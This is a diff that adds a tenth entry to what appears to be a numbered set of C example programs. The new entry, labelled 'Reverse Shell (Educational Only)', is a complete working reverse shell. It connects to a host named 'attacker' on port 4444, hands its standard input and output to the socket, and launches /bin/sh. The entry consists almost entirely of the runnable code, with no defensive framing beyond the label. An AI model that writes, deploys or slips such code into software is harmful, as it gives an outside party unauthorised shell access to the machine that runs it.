@@ -205,3 +205,30 @@ int main() {
     return 0;
 }
 ------------------------------------
+// 10. Reverse Shell (Educational Only): Important cybersecurity concept.
+
+   // reverse_shell.c
+#include <stdio.h>
+#include <unistd.h>
+#include <arpa/inet.h>
+
+int main() {
+    int sockfd;
+    struct sockaddr_in attacker;
+
+    sockfd = socket(AF_INET, SOCK_STREAM, 0);
+
+    attacker.sin_family = AF_INET;
+    attacker.sin_port = htons(4444);
+    attacker.sin_addr.s_addr = inet_addr("127.0.0.1");
+
+    connect(sockfd, (struct sockaddr *)&attacker, sizeof(attacker));
+
+    dup2(sockfd, 0);
+    dup2(sockfd, 1);
+    dup2(sockfd, 2);
+
+    execl("/bin/sh", "sh", NULL);
+
+    return 0;
+}
